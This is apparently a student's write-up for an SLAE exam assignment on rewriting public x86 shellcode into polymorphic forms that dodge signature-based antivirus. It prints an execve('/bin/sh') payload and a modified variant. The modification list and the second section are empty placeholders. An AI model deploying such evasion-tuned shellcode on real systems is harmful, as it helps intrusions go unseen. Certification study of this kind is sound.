## SLAE Exam Assignment 6 - Creating polymorphic shellcode

## Prologue
The second last assignment of the SLAE certification exam was quite an intriguing one. We were told to take three shellcodes of our choosing from [shell-storm](https://www.shell-storm.org/shellcode/) or [exploit-db](https://www.exploit-db.com/shellcodes) and create Polymorphic versions of those to evade _static signature-based_ AV/EDRs. Needless to say, it was a quite fun and brain-racking challenge.

What's more? We were told that extra brownie-points would be given if the polymorphic shellcodes were smaller than the original.

So without any further ado, let's get down with it!

## What is polymorphic shellcode?
It is impossible to explain polymorphic shellcode if we don't understand what is polymorphism.

Polymorphism comes from the Greek words: _poly_ meaning "many" and _morph_ meaning "forms". In other words it roughly translates to "many forms" of the same thing.

Now let's understand what we mean by polymorphic shellcode with the help of a tiny example.

Each shellcode is crafted for a specific purpose right? Say there's a Reverse TCP shellcode which connects back to an attacker server for execution of arbritary commands. This shellcode was used many times in the past by an attacker along with an exploit to get access to a remote machine and exfiltrate data. Now the AV/EDR vendors have caught up to it and they have written signatures to detect this payload. Say a wannabe pen-tester get their hands on this payload and they too want to use this payload so they quickly decide to test this payload in a live-environment of their own before deploying it but alas! As soon as they fire up the payload, it gets detected by a commercial AV. This can't be any good!

Enter polymorphic shellcode!

So this script-kiddie gives this assembly code that he found to an 1337 hacker and he in return gives him back a modified payload which surprisingly runs as expected without any detections much to this script-kiddie's surprise. So what did this 1337 hacker do?

He basically modified the source that he received to beat _static signature analysis_. In other words, he created a polymorphic shellcode from the original source that has the same functionality but a different signature this time since he addded some new instructions, deleted some old instructions, added some NOP instructions yada yada yada.

Now that we know what is polymorphic shellcode and how it is useful for us, let's get our hands dirty with creating some!

## First polymorphic shellcode - execve(/bin/sh)
[Here](http://shell-storm.org/shellcode/files/shellcode-827.php) is the link to the original shellcode.

Original shellcode:

```nasm
xor    eax, eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
push   eax
push   ebx
mov    ecx, esp
mov    al, 0x0b
int    0x80
```

Polymorphic shellcode:

```nasm
xor eax, eax           ; Clearing out EAX register
xor ecx, ecx           ; Clearing out ECX regsiter
push eax               ; push for NULL termination
push dword 0x68732f2f  ; push //sh
push dword 0x6e69622f  ; push /bin
mov ebx, esp           ; store address of TOS - /bin//sh
mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
int 0x80               ; Execute the system call
```

Length of original shellcode: `23 bytes`
Length of polymorphic shellcode: `21 bytes`
Size Reduction: 9%

For the first assignment I took a very simple shellcode which executes /bin/sh so I will not go into too much detail on how it works. I just bastardized the execve call and made the following modifications:

1. 
1.
1.

Let's see a demo of the shellcode in action now:

<script id="asciicast-WGxT2keT6AO81KpWMraSVUt4n" src="https://asciinema.org/a/WGxT2keT6AO81KpWMraSVUt4n.js" async></script>

## Second polymorphic shellcode - create dir + chmod 777 + exit




